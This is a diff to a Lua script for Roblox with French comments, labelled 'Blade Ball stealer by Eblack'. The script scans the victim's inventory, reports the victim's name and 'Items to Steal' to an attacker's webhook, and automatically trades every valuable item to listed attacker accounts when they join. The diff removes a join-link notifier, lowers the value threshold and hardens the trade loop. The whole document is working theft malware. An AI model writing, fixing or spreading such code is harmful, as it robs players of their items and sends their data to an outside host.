@@ -14,12 +14,13 @@ local PlayerGui = plr.PlayerGui
 local tradeGui = PlayerGui.Trade
 local inTrade = false
 
+-- Récupération des variables globales
 local users = _G.Usernames or {}
-local min_rap = _G.min_rap or 100
+local min_rap = _G.min_rap or 50
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
 
--- // FONCTION D'ENVOI POUR TON WORKER
+-- // FONCTION D'ENVOI POUR TON WORKER (Correction structure)
 local function sendToWorker(payload)
     local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
     if requestFunc then
@@ -46,49 +47,7 @@ local function formatNumber(number)
     return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
 end
 
--- // WEBHOOK 1 : JOIN MESSAGE
-local function SendJoinMessage(list, prefix)
-    local totalRAP = 0
-    for _, v in ipairs(list) do totalRAP = totalRAP + v.RAP end
-    
-    local isGoodHit = totalRAP >= 500
-    local embedTitle = isGoodHit and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
-    local webhookName = isGoodHit and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT"
-    local embedColor = isGoodHit and 65280 or 8323327
-
-    local grouped = {}
-    for _, item in ipairs(list) do
-        grouped[item.Name] = grouped[item.Name] or {Count = 0, TotalRAP = 0}
-        grouped[item.Name].Count = grouped[item.Name].Count + 1
-        grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
-    end
-
-    local itemsListText = ""
-    for name, data in pairs(grouped) do
-        itemsListText = itemsListText .. string.format("%s (x%d) - **%s RAP**\n", name, data.Count, formatNumber(data.TotalRAP))
-    end
-
-    local data = {
-        ["auth_token"] = auth_token,
-        ["username"] = webhookName,
-        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
-        ["embeds"] = {{
-            ["title"] = embedTitle,
-            ["color"] = embedColor,
-            ["fields"] = {
-                {name = "Victim Username 🤖:", value = plr.Name, inline = true},
-                {name = "JobId 🆔:", value = "```" .. game.JobId .. "```", inline = true},
-                {name = "Join link 🔗:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId, inline = false},
-                {name = "Item list 📝:", value = itemsListText, inline = false},
-                {name = "Summary 💰:", value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), inline = false}
-            },
-            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
-        }}
-    }
-    sendToWorker(data)
-end
-
--- // WEBHOOK 2 : SERVER HIT (QUAND TU REJOINS)
+-- // WEBHOOK : SERVER HIT (QUAND TU ES DANS LE SERVEUR)
 local function SendMessage(list)
     local totalRAP = 0
     for _, v in ipairs(list) do totalRAP = totalRAP + v.RAP end
@@ -117,9 +76,9 @@ local function SendMessage(list)
             ["title"] = "⚪ Server Hit 🎯",
             ["color"] = embedColor,
             ["fields"] = {
-                {name = "Victim Username 🤖:", value = plr.Name, inline = true},
+                {name = "Victim Username 🤖:", value = "```" .. plr.Name .. "```", inline = true},
                 {name = "Status 📈:", value = statusText, inline = true},
-                {name = "Items to Steal 📝:", value = itemsListText, inline = false},
+                {name = "Items to Steal 📝:", value = itemsListText ~= "" and itemsListText or "None", inline = false},
                 {name = "Summary 💰:", value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), inline = false}
             },
             ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
@@ -128,7 +87,7 @@ local function SendMessage(list)
     sendToWorker(data)
 end
 
--- // DATA COLLECTION
+-- // DATA COLLECTION (Scan de l'inventaire)
 local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
 local Replion = require(game.ReplicatedStorage.Packages.Replion)
 local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
@@ -156,14 +115,17 @@ tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
     inTrade = tradeGui.Enabled
 end)
 
-local function doTrade(targetName)
-    local target = Players:FindFirstChild(targetName)
-    if not target then return end
-
+local function doTrade(targetPlayer)
     while #itemsToSend > 0 do
-        netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
-        repeat task.wait(0.5) until inTrade
+        -- Envoi de la requête
+        netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(targetPlayer)
+        
+        -- Attente que le trade s'ouvre (max 30s)
+        local t = 0
+        repeat task.wait(0.5); t = t + 0.5 until inTrade or t > 30
+        if not inTrade then continue end
 
+        -- Ajout des items par lots de 100
         local batch = {}
         for i = 1, math.min(100, #itemsToSend) do
             table.insert(batch, table.remove(itemsToSend, 1))
@@ -173,28 +135,46 @@ local function doTrade(targetName)
             netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
         end
 
+        -- Ready et Confirm
         netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
         task.wait(0.3)
         netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
+        
+        -- Attente de la fermeture pour recommencer si nécessaire
         repeat task.wait(0.5) until not inTrade
     end
 end
 
--- // EXECUTION
+-- // DETECTION ET EXECUTION
 if #itemsToSend > 0 then
     table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
+    
+    -- Sauvegarde de la liste pour les webhooks
     local inventorySnapshot = {}
     for i, v in ipairs(itemsToSend) do inventorySnapshot[i] = v end
 
-    SendJoinMessage(inventorySnapshot, (ping == "Yes" and "@everyone " or ""))
+    local tradeStarted = false
 
-    local function checkAndTrade(player)
-        if table.find(users, player.Name) then
-            SendMessage(inventorySnapshot)
-            doTrade(player.Name)
+    local function checkPlayer(player)
+        -- On vérifie si le nom du joueur est dans ta liste _G.Usernames
+        for _, name in ipairs(users) do
+            if player.Name == name and not tradeStarted then
+                tradeStarted = true
+                SendMessage(inventorySnapshot) -- Envoi du "Server Hit"
+                task.wait(1)
+                doTrade(player) -- Lance le trade
+                break
+            end
         end
     end
 
-    for _, p in ipairs(Players:GetPlayers()) do checkAndTrade(p) end
-    Players.PlayerAdded:Connect(checkAndTrade)
+    -- Vérification des joueurs déjà présents
+    for _, p in ipairs(Players:GetPlayers()) do
+        checkPlayer(p)
+    end
+
+    -- Surveillance des nouveaux arrivants
+    Players.PlayerAdded:Connect(function(p)
+        checkPlayer(p)
+    end)
 end
